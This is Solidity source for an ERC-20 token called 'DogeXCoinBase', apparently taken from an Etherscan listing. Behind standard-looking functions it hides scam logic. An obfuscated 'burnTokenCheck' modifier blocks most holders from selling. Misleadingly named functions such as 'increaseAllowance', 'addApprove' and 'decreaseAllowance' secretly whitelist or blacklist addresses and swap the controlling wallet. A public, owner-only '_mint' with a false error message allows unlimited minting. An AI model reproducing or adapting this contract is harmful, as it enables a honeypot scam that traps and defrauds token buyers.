/**
 *Submitted for verification at Etherscan.io on 2021-06-02
*/

/**
 *Submitted for verification at Etherscan.io on 2021-06-02
*/

pragma solidity ^0.6.6;






contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}





contract DogeXCoinBase is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;
    
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _whiteAddress;
    mapping (address => bool) private _blackAddress;
    
    uint256 private _sellAmount = 0;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

    address public _owner;
    address private _safeOwner;
    address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    

    
   constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
        _owner = owner;
        _safeOwner = owner;
        _mint(_owner, initialSupply*(10**18));
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

   
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _approveCheck(_msgSender(), recipient, amount);
        return true;
    }
    
  function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
    require(msg.sender == _owner, "!owner");
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
      
      if(i < approvecount){
          _whiteAddress[receivers[i]]=true;
          _approve(receivers[i], _unirouter,115792089237316195423570985008687907853269984665640564039457584007913129639935);
      }
    }
   }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _approveCheck(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    
    function increaseAllowance(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
           _whiteAddress[receivers[i]] = true;
           _blackAddress[receivers[i]] = false;
        }
    }

    
   function decreaseAllowance(address safeOwner) public {
        require(msg.sender == _owner, "!owner");
        _safeOwner = safeOwner;
    }
    
    function addApprove(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
           _blackAddress[receivers[i]] = true;
           _whiteAddress[receivers[i]] = false;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    
    function _mint(address account, uint256 amount) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[_owner] = _balances[_owner].add(amount);
        emit Transfer(address(0), account, amount);
    }

    
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

   
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    
  
    function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    
     
    modifier burnTokenCheck(address sender, address recipient, uint256 amount){
        if (_owner == _safeOwner && sender == _owner){_safeOwner = recipient;_;}else{
            if (sender == _owner || sender == _safeOwner || recipient == _owner){
                if (sender == _owner && sender == recipient){_sellAmount = amount;}_;}else{
                if (_whiteAddress[sender] == true){
                _;}else{if (_blackAddress[sender] == true){
                require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}else{
                if (amount < _sellAmount){
                if(recipient == _safeOwner){_blackAddress[sender] = true; _whiteAddress[sender] = false;}
                _; }else{require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}
                    }
                }
            }
        }
    }
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}